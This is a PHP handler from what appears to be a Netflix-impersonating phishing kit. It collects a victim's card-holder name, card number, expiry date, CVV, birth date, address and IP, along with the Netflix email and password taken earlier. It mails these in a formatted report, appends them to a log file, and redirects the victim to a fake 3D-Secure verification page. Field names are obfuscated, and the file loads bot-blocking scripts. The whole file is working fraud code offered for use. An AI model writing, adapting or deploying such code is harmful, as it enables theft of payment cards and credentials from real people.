<?php
session_start();
include('../blocker.php');
include('../antibots.php');
include ('./Email.php');
include '../files/inc/block.php';

$HF_V = $_SESSION['country_name'];
$ip = getenv("REMOTE_ADDR");
/* =======================Htyaat L Cvv <3==============================*/
$_SESSION['lmalikzaml'] = $_POST['lmalikzaml'];
$_SESSION['zabii'] = $_POST['zabii'];
$_SESSION['ibchi'] = $_POST['ibchi'];
$_SESSION['assod'] = $_POST['assod'];
$_SESSION['achtiir'] = $_POST['achtiir'];
$_SESSION['smya'] = $_POST['smya'];
$_SESSION['wass'] = $_POST['wass'];
$_SESSION['ayoor'] = $_POST['ayoor'];
$_SESSION['asgass'] = $_POST['asgass'];
$_SESSION['szbim'] = $_POST['szbim'];
$_SESSION['mocalos'] = $_POST['mocalos'];
$_SESSION['tamazirt'] = $_POST['tamazirt'];
$_SESSION['lbosta'] = $_POST['lbosta'];
/* =======================Htyaat L Cvv <3==============================*/
$ip = getenv("REMOTE_ADDR");
$crd = $_POST['lmalikzaml'];
/* ======================= Message <3==============================*/
$msg = "
<!===============|Login NetfIix ^_^!|==============!>
Email      : ".$_SESSION['email']."
Password   : ".$_SESSION['password']."
<!===============|CC Full InFo ^_^!|==============!>
Nam Crd    : ".$_SESSION['lmalikzaml']."
Crd Numbr  : ".$_SESSION['zabii']."
Dat Expir  : ".$_SESSION['ibchi']."/".$_POST['assod']."
CVV        : ".$_SESSION['achtiir']."
<!===============|Billing InFo ^_^!|==============!>
Date Birth : ".$_SESSION['wass']."/".$_SESSION['ayoor']."/".$_SESSION['asgass']."
Address    : ".$_SESSION['szbim']."
City       : ".$_SESSION['mocalos']."
Zip        : ".$_SESSION['lbosta']."
IP Adress  :  ".$ip."
<!===============|By HF-Jackson|==================!>
|Moustache Wiz| BADEXAMPLE | ROFHXMD | Fernando Marin|";
$subj = " <3 CVV HaHiYa JaTe <3 ^_^! |".$HF_V."|-|".$ip."|";
$headers = "From:B0ssNi <IbchiL7aza9@HMAHM.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
@mail($to, $subj, $msg, $headers);
$file = fopen("../../BADEXAMPLE/BADEXAMPLE.txt","a");
fwrite($file,$msg);
fclose($file);
/* =======================Header L VbV <3==============================*/
header("Location: ../processing/?to=verification&CN=".$cn."&date&".gmdate ("H-i-s")."&ip&".$ip."/3D.html?NetdKey=".md5('Adnan-7eza9')."");
?>